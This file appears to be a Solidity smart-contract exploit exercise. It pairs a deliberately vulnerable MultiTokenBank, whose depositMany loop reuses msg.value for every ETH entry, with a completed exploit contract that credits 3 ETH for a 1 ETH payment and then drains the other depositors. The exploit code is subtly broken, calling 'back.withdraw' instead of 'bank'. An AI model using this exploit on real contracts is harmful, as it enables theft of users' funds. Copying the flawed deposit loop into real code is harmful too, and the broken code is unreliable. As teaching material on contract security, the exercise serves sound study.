/*

MultiTokenBank is a bank accepting ETH and any ERC20 token.

Alice and Bob each has deposited 1 ETH.

import "./IERC20.sol";

contract MultiTokenBank {
    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    mapping(address => mapping(address => uint)) balances;

    function depositMany(
        address[] calldata _tokens,
        uint[] calldata _amounts
    ) public payable {
        for (uint i = 0; i < _tokens.length; i++) {
            deposit(_tokens[i], _amounts[i]);
        }
    }

    function deposit(address _token, uint _amount) public payable {
        if (_token == ETH) {
            require(_amount == msg.value, "amount != msg.value");
        } else {
            IERC20(_token).transferFrom(msg.sender, address(this), _amount);
        }
        balances[_token][msg.sender] += _amount;
    }

    function withdraw(address _token, uint _amount) public {
        balances[_token][msg.sender] -= _amount;

        if (_token == ETH) {
            payable(msg.sender).transfer(_amount);
        } else {
            IERC20(_token).transfer(msg.sender, _amount);
        }
    }
}

Task:
    - There are 2 ETH (2 * 10 ** 18) in MultiTokenBank. One ETH from Alice, one from Bob.
      Drain all of ETH from the contract. pwn will be given 10 ETH.

*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract MultiTokenBank {
    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    mapping(address => mapping(address => uint)) balances;

    function depositMany(
        address[] calldata _tokens,
        uint[] calldata _amounts
    ) public payable {
        for (uint i = 0; i < _tokens.length; i++) {
            deposit(_tokens[i], _amounts[i]);
        }
    }

    function deposit(address _token, uint _amount) public payable {
        if (_token == ETH) {
            require(_amount == msg.value, "amount != msg.value");
        } else {
            IERC20(_token).transferFrom(msg.sender, address(this), _amount);
        }
        balances[_token][msg.sender] += _amount;
    }

    function withdraw(address _token, uint _amount) public {
        balances[_token][msg.sender] -= _amount;

        if (_token == ETH) {
            payable(msg.sender).transfer(_amount);
        } else {
            IERC20(_token).transfer(msg.sender, _amount);
        }
    }
}

interface IMultiTokenBank {
    function balances(address, address) external view returns (uint);

    function depositMany(address[] calldata, uint[] calldata) external payable;

    function deposit(address, uint) external payable;

    function withdraw(address, uint) external;
}

contract MultiTokenBankExploit {
    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    IMultiTokenBank public bank;

    constructor(address _bank) {
        bank = IMultiTokenBank(_bank);
    }

    receive() external payable {}

    function pwn() external payable {
        // write your code here
        address[] memory tokens = new address[](3);
        tokens[0] = ETH;
        tokens[1] = ETH;
        tokens[2] = ETH;

        uint[] memory amounts = new uint[](3);
        amounts[0] = 1e18;
        amounts[1] = 1e18;
        amounts[2] = 1e18;


        bank.depositMany{value: 1e18}(tokens, amounts);
        back.withdraw(ETH, 3 * 1e18);
    }
}
